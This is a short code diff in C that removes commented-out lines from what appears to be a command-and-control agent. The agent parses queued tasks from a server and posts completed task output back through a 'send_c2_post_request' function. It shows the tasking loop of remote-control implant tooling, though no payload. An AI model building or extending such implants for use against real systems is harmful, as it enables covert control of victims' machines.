@@ -272,7 +272,6 @@ cJSON *tasks = cJSON_GetObjectItemCaseSensitive(root, "tasks");
 if(cJSON_IsArray(tasks)){
 cJSON *task = NULL;
 cJSON_ArrayForEach(task,tasks){
-    //dispatcher(task);
     cJSON* d_task = cJSON_Duplicate(task,1);
     enqueue(&q, d_task);
                               }
@@ -280,7 +279,6 @@ cJSON_ArrayForEach(task,tasks){
                        }
 
                  }
-//free(resp);
 cJSON_Delete(root);
 return;
               }
@@ -294,7 +292,6 @@ cJSON *tasks = cJSON_GetObjectItemCaseSensitive(root, "tasks");
 if(cJSON_IsArray(tasks)){
 cJSON *task = NULL;
 cJSON_ArrayForEach(task,tasks){
-    //dispatcher(task);
     cJSON* d_task = cJSON_Duplicate(task,1);
     enqueue(&q, d_task);
                               }
@@ -490,7 +487,6 @@ cJSON_SetValuestring(statusik,"success");
 cJSON *completed = cJSON_GetObjectItemCaseSensitive(obj,"completed");
 cJSON_SetBoolValue(completed, 1);
 
-//cJSON_DeleteItemFromObject(cJSON_GetObjectItemCaseSensitive(obj,"user_output"),);
 char* unformatted_buff = cJSON_PrintUnformatted(root);
 char* ans = send_c2_post_request(unformatted_buff);
 parse_tasks(ans);
